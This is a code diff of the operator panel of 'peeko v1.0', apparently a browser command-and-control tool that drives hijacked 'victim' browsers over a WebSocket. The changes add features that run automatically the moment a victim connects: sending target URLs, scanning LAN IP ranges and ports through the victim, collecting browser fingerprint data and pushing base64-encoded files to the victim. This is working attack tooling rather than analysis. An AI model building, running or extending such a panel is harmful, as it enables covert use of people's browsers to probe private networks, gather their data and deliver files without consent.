@@ -61,19 +61,16 @@
   <h1>peeko</h1>
   <p>v1.0</p>
 
-  <div class="section">
-    <label for="victimSelect">🧍 Select Victim:</label><br>
-    <select id="victimSelect">
-      <option value="">-- No victims connected --</option>
-    </select>
-  </div>
-
+  <!-- Target URL Section -->
   <div class="section">
     <label for="url">🎯 Target URL:</label><br>
     <input id="url" placeholder="https://192.168.1.124:8080/example.html" size="60">
     <button onclick="send()">Send</button>
+    <br>
+    <input type="checkbox" id="autoTarget"> Auto Target on Connect
   </div>
 
+  <!-- Scan LAN Targets Section -->
   <div class="section">
     <label>Scan LAN Targets</label><br>
     IP / Range / CIDR:
@@ -81,9 +78,19 @@
     Ports:
     <input id="ports" placeholder="80,8080,3000-3010" size="30">
     <button onclick="scan()">🔍 Start Scan</button>
+    <br>
+    <input type="checkbox" id="autoScan"> Auto Scan on Connect
   </div>
 
-  <!-- New section for collecting browser info -->
+  <!-- Victim Selector Section -->
+  <div class="section">
+    <label for="victimSelect">🧍 Select Victim:</label><br>
+    <select id="victimSelect">
+      <option value="">-- No victims connected --</option>
+    </select>
+  </div>
+
+  <!-- Collect Browser Information Section -->
   <div class="section">
     <label>Collect Browser Information</label><br>
     <input type="checkbox" id="info_useragent" checked> User Agent string<br>
@@ -96,6 +103,15 @@
     <button onclick="collectInfo()">Collect Info</button>
   </div>
 
+  <!-- File Upload Section -->
+  <div class="section">
+    <label>File Upload</label><br>
+    <input type="file" id="fileInput"><br>
+    <button onclick="sendFile()">Send File</button><br>
+    <input type="checkbox" id="autoUpload"> Auto Upload on Connect
+  </div>
+
+  <!-- Log Output Section -->
   <div class="section">
     <label>📡 Log Output</label>
     <div>
@@ -107,15 +123,14 @@
   </div>
 
   <footer>
-    peeko v1.0 – by b3rito at mes3hacklab  & GioPpeTto
+    peeko v1.0 – by b3rito at mes3hacklab & GioPpeTto
   </footer>
 
   <script>
-    const socket = new WebSocket("wss://SERVER-IP:8443/ws");
+    const socket = new WebSocket("wss://192.168.1.12:8443/ws");
     const victimSelect = document.querySelector("#victimSelect");
     const logOutput = document.querySelector("#response");
     const logLines = [];
-    // Store additional metadata for each victim.
     const victimsData = {};
 
     socket.onopen = () => {
@@ -124,11 +139,10 @@
     };
 
     socket.onmessage = event => {
-      // Trim the incoming message to remove extra whitespace/newlines.
       const msg = event.data.trim();
-      console.log("Received message:", msg);  // Debug log to browser console.
+      console.log("Received message:", msg);
 
-      // Check if the message contains the collected info prefix.
+      // Check if the message contains collected info data.
       const collectedIndex = msg.indexOf("[COLLECTED INFO]");
       if (collectedIndex !== -1) {
         const infoStr = msg.slice(collectedIndex + "[COLLECTED INFO]".length).trim();
@@ -143,8 +157,6 @@
       }
 
       const interesting = ["[✅]", "[📄]", "[🟢]", "[🔴]"];
-
-      // Remove a victim prefix if present.
       let toCheck = msg;
       if (msg.startsWith("[") && msg.indexOf("]") !== -1) {
         const firstPrefix = msg.substring(0, msg.indexOf("]") + 1);
@@ -152,24 +164,32 @@
           toCheck = msg.substring(msg.indexOf("]") + 1).trim();
         }
       }
-
-      // Log the message if it starts with an interesting prefix.
       if (interesting.some(prefix => toCheck.startsWith(prefix))) {
         log(msg);
       } else {
-        // Fallback: log any raw message.
         log("[RAW] " + msg);
       }
 
       // Process victim connection events.
-      // Expected format: "[🟢] Victim connected: victim-1 (192.168.1.14)"
       if (msg.startsWith("[🟢] Victim connected: ")) {
         const match = msg.match(/Victim connected: (victim-\d+)\s+\(([^)]+)\)/);
         if (match) {
           addVictim(match[1], match[2]);
-          // If auto-collect is enabled, send the collect command immediately.
+          // Auto Collect if enabled.
           if (document.querySelector("#autoCollect").checked) {
             sendCollectCommand(match[1]);
+          }
+          // Auto Scan if enabled.
+          if (document.querySelector("#autoScan").checked) {
+            autoScanForVictim(match[1]);
+          }
+          // Auto Target if enabled.
+          if (document.querySelector("#autoTarget").checked) {
+            autoTargetForVictim(match[1]);
+          }
+          // Auto Upload if enabled.
+          if (document.querySelector("#autoUpload").checked) {
+            autoUploadForVictim(match[1]);
           }
         }
       }
@@ -207,7 +227,31 @@
       }
     }
 
-    // Build the collect info command based on selected checkboxes.
+    // Auto-scan function.
+    function autoScanForVictim(victimId) {
+      const ipInput = document.querySelector("#iprange").value.trim();
+      const portInput = document.querySelector("#ports").value.trim();
+      const ips = expandIPRange(ipInput);
+      const ports = expandPortList(portInput);
+      for (const ip of ips) {
+        for (const port of ports) {
+          const url = `https://${ip}:${port}`;
+          socket.send(`to:${victimId}|${url}`);
+        }
+      }
+      log(`[AUTO SCAN] Sent scan commands to ${victimId}`);
+    }
+
+    // Auto-target function.
+    function autoTargetForVictim(victimId) {
+      const url = document.querySelector("#url").value;
+      if (url) {
+        socket.send(`to:${victimId}|${url}`);
+        log(`[AUTO TARGET] Sent URL command to ${victimId}`);
+      }
+    }
+
+    // Build the collect info command.
     function buildCollectCommand() {
       const fields = [];
       if (document.querySelector("#info_useragent").checked) fields.push("useragent");
@@ -219,38 +263,72 @@
       return "collectinfo:" + fields.join(",");
     }
 
-    // Send the collect info command to a specified victim.
+    // Send the collect info command.
     function sendCollectCommand(victimId) {
       const command = buildCollectCommand();
       socket.send(`to:${victimId}|${command}`);
       log(`[INFO REQUEST SENT] to ${victimId}: ${command}`);
     }
 
-    // Trigger info collection for the currently selected victim.
+    // Manual info collection.
     function collectInfo() {
       const victim = getSelectedVictim();
       if (!victim) return alert("⚠️ Select a victim first.");
       sendCollectCommand(victim);
     }
 
-    // Updated addVictim function to store and display metadata.
-    function addVictim(id, ip) {
-      victimsData[id] = {
-        ip: ip,
-        connectionTime: new Date()
+    // Manual file upload.
+    function sendFile() {
+      const fileInput = document.querySelector("#fileInput");
+      if (!fileInput.files.length) {
+        return alert("No file selected");
+      }
+      const file = fileInput.files[0];
+      const reader = new FileReader();
+      reader.onload = function(event) {
+        const dataUrl = event.target.result;
+        const base64Data = dataUrl.split(",")[1];
+        const command = `file:${file.name}|${base64Data}`;
+        const victim = getSelectedVictim();
+        if (!victim) return alert("Select a victim first");
+        socket.send(`to:${victim}|${command}`);
+        log(`[FILE SENT] ${file.name} (${file.size} bytes)`);
       };
+      reader.readAsDataURL(file);
+    }
+
+    // Auto upload function.
+    function autoUploadForVictim(victimId) {
+      const fileInput = document.querySelector("#fileInput");
+      if (!fileInput.files.length) {
+        log("[AUTO UPLOAD] No file selected for auto upload.");
+        return;
+      }
+      const file = fileInput.files[0];
+      const reader = new FileReader();
+      reader.onload = function(event) {
+        const dataUrl = event.target.result;
+        const base64Data = dataUrl.split(",")[1];
+        const command = `file:${file.name}|${base64Data}`;
+        socket.send(`to:${victimId}|${command}`);
+        log(`[AUTO UPLOAD] Sent file "${file.name}" (${file.size} bytes) to ${victimId}`);
+      };
+      reader.readAsDataURL(file);
+    }
+
+    // Add victim function.
+    function addVictim(id, ip) {
+      victimsData[id] = { ip: ip, connectionTime: new Date() };
       const exists = [...victimSelect.options].some(opt => opt.value === id);
       if (!exists) {
         const opt = document.createElement("option");
         opt.value = id;
-        // Display both the victim id and IP address.
         opt.textContent = `${id} (${ip})`;
         if (victimSelect.options.length === 1) victimSelect.selectedIndex = 1;
         victimSelect.appendChild(opt);
       }
     }
 
-    // Updated removeVictim function to delete metadata.
     function removeVictim(id) {
       delete victimsData[id];
       [...victimSelect.options].forEach(opt => {
@@ -280,11 +358,7 @@
       const [ip, mask] = cidr.split("/");
       const maskInt = parseInt(mask);
       const ipParts = ip.split(".").map(Number);
-      const ipInt =
-        (ipParts[0] << 24) |
-        (ipParts[1] << 16) |
-        (ipParts[2] << 8) |
-        ipParts[3];
+      const ipInt = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
       const hosts = 2 ** (32 - maskInt);
       const list = [];
       for (let i = 1; i < hosts - 1; i++) {
